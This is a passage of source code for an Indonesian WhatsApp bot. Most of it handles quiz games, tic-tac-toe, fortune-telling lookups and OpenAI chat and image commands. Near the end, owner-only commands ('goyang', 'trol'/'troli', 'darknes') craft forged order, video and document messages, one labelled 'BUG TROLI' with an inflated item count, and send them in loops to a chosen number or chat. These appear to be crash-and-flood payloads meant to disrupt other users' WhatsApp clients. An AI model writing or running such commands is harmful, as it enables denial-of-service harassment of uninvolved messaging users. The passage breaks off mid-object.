                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, { quoted: m })         
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    haikal.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , { quoted: m })         
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    haikal.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, { quoted: m })         
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
            if (!isCreator) return m.reply(mess.owner)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                haikal.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./baseikal/lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = from
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: from,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            m.reply(`Berhasil delete session room tictactoe !`)
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await haikal.sendText(from, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) haikal.sendText(from, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ, 7, 7, 2005, Putri, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case 'artinama': {
if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ Hw`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ|Putri`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (!isCreator) return m.reply(mess.owner)
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            
            case 'zodiak': case 'zodiac': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                haikal.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
haikal.relayMessage(from, { reactionMessage }, { messageId: "AMPUN TUAN haikalN🥺🙏" }),
await sleep(3000)
haikal.relayMessage(from, { reactionMessage }, { messageId: "AMPUN TUAN haikalN🥺🙏" }),
await sleep(3000)
haikal.relayMessage(from, { reactionMessage }, { messageId: "AMPUN TUAN haikalN🥺🙏" }),
await sleep(3000)
haikal.relayMessage(from, { reactionMessage }, { messageId: "AMPUN TUAN haikalN🥺🙏" }),
await sleep(3000)
haikal.relayMessage(from, { reactionMessage }, { messageId: "AMPUN TUAN haikalN🥺🙏" }),
await sleep(3000)
haikal.relayMessage(from, { reactionMessage }, { messageId: "AMPUN TUAN haikalN🥺🙏" })
}
break
case 'ai':
try {
if (global.keyopenai === '') return m.reply("Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file config.js\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys");
if (!q) return m.reply(`Chat dengan AI.\n\nContoh:\n${comand} Apa itu coding`)
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
m.reply(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
m.reply("Maaf, sepertinya ada yang error :"+ error.message);
}
}
break
case "aimage":
try {
if (global.keyopenai === '') return m.reply("Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file config.js\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys");
if (!q) return m.reply(`Chat dengan AI.\n\nContoh:\n${comand} Apa itu coding`)
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
haikal.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
m.reply("Maaf, sepertinya ada yang error :"+ err);
}
break
case 'kai':{
m.reply(`Mau Buka Fitur Ai Yah ?
ketik Aja 
Contoh : Ai carikan resep ayam kemangi
Contoh : Aimage Gambar Goku`)
}
break
case 'goyang': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var video = generateWAMessageFromContent(from, proto.Message.fromObject({
	"videoMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7161-24/11869064_1177744076278495_1381599896756629852_n.enc?ccb=11-4&oh=01_AdR-hPKVes5IPqEE7J9EO82yJPtLmSHeoR76asU3vqX5EQ&oe=642ABB0B&mms3=true",
					"mimetype": "video/mp4",
					"fileSha256": "cYBOBhD7hu2LfTNFCKulWERsFdEkiLkTrNtJVSjVS+Y=",
					"fileLength": "556497",
					"seconds": 8,
					"mediaKey": "ljAJeMj6N2SMuAnsB/oILKOtoyd/0O7k7t6pXPPCCJc=",
					"caption": `MODDED BY ʜᴡ ᴍᴏᴅꜱ ᴡᴀ - PUNYA NYALI GA BUAT TONTON VIDEO NYA ?`,
					"height": 720,
					"width": 1280,
					"fileEncSha256": "JwnEB8GY4awJ2OU89qN8pA+jp2862VRW94G2awDFIWM=",
					"directPath": "/v/t62.7161-24/11869064_1177744076278495_1381599896756629852_n.enc?ccb=11-4&oh=01_AdR-hPKVes5IPqEE7J9EO82yJPtLmSHeoR76asU3vqX5EQ&oe=642ABB0B&_nc_hot=1677950916",
					"mediaKeyTimestamp": "1677857645",
					"jpegThumbnail": thumb,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, video.message, { messageId: video.key.id })
sticSukses(from)
}
break

case 'wm': {
if (!isCreator) return m.reply(mess.owner)
if (!args.join(" ")) return reply(`Example :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
haikal.downloadAndSaveMediaMessage(quoted, "gifee")
haikal.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await (m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break



case 'trol': case 'hakol': case 'hatol': case 'troli': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY ʜᴡ ᴍᴏᴅꜱ ᴡᴀ",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
haikal.relayMessage(from, order.message, { messageId: order.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'darknes': case 'darknes2': case 'darknes3': case 'darknes4': case 'darknes5': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
